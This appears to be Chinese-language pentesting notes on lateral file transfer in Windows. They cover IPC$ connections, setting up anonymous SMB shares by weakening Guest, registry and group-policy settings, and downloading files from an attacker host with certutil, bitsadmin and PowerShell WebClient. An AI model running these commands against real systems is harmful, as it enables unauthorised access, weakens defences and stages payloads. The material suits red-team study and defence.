# 横向文件传输

#### IPC$网络共享

Windows系统默认开启的网络共享(net share查看)

```
- C$：C盘共享
- ADMIN$：系统目录共享
- IPC$："命名管道"资源共享，作用为了进程之间通信开放，通过任何对方用户名和口令，连接双方可建立安全的通道并以此通道进行加密数据的交换。
```

IPC$连接具备条件：

```
1. 远程主机开启了IPC$共享
2. 远程主机139和445端口开放
```

IPC$连接

```
net use \\192.168.0.105\IPC$ "P@ssW0rd!" /user:"Administrator"
net use
```

#### SMB服务器

关于SMB

```
又称CIFS，网络文件共享系统
应用层网络传输协议
一般使用NetBIOS协议(135端口)或者TCP(445端口)发送，主流为445
```

kali Linux起SMB(匿名共享)(impackt项目smbserve)：

```
mkdir /root/share
python3 smbserver.py lbwnb /root/share -smb2support
```

CMD命令行起SMB(管理员权限):

* 启用来宾账户Guest

```
net user guest /active:yes
```

* Everyone权限赋予于匿名用户

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
```

* 指定匿名共享文件的位置

```
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d smb /f
```

* 将Guest用户从策略]]“拒绝从网络访问这台计算机”中移除

```
导出组策略：secedit /export /cfg gp.inf /quiet
修改文件gp.inf，将SeDenyNetworkLogonRight = Guest修改为SeDenyNetworkLogonRight =,
重新导入组策略：secedit /configure /db gp.sdb /cfg gp.inf /quiet
强制刷新组策略，立即生效(否则，重启后生效)：gpupdate/force
```

* 设置文件共享

```
icacls C:\share\ /T /grant Everyone:r
net share share=c:\share /grant:everyone,full
```

ps1开SMB:

https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer

````
```
[[允许运行ps1脚本]]
Set-ExecutionPolicy unrestricted

[[开启可匿名访问的文件共享服务器]]
Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable

[[关闭可匿名访问的文件共享服务器：]]
Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable
````

#### Windows本地工具利用

Certutil：

* Windows自带命令行工具
* 用于管理Windows证书并作为证书服务的一部分安装
* 提供从网络下载文件的功能

```
CertUtil -urlcache -split -f http://192.168.0.108:8000/lbwnb.txt C:\123.txt
```

BITSAdmin:

* Windows自带命令行工具
* 用于创建下载和上次作业，监视进度
* Windows7及之后的版本才开始自带

```
bitsadmin /transfer test http://192.168.0.108:8000/lbwnb.txt C:\123.txt
```

PowerShell WebClient:

* 远程加载执行思路
* 创建WebClient对象实现文件下载

```
(New-Object Net.WebClient).downloadfile('http://192.168.0.108:8000/lbwnb.txt','C:\Users\123.txt')
```
